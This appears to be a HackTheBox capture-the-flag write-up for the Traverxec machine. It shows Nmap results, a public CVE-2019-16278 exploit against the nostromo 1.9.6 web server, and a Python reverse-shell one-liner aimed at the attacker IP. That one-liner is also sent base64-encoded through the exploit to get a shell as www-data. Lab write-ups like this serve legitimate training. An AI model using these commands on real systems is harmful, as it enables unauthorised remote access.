# Traverxec HackTheBox

![image](https://user-images.githubusercontent.com/5285547/124390855-611f6100-dce5-11eb-9e04-504177808d60.png)


## Nmap 

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
```

What's nostromo 1.9.6? I've not seen that before. 
Let's check it out. 

## www-data 

Finding an exploit online and checking it out, seems a socket is used to connect back to the server, nice!

Exploit: https://www.exploit-db.com/exploits/47837

```
 python2.7 cve2019_16278.py 10.10.10.165 80 id
```

![image](https://user-images.githubusercontent.com/5285547/124392012-510a8000-dceb-11eb-98b7-078c1895ce3c.png)

Nice, time for a reverse shell. 

## Payload

python3
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.15",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

- Then base64 encoded
- Then urlencoded (all charaters)


- Final payload & command
```
python2.7 cve2019_16278.py 10.10.10.165 80 "echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjE1Iiw5OTk5KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiYmFzaCIpJw%3D%3D|base64 -d|bash"
```

![image](https://user-images.githubusercontent.com/5285547/124392273-7a77db80-dcec-11eb-991f-d8bb03df01b4.png)


We're on the box




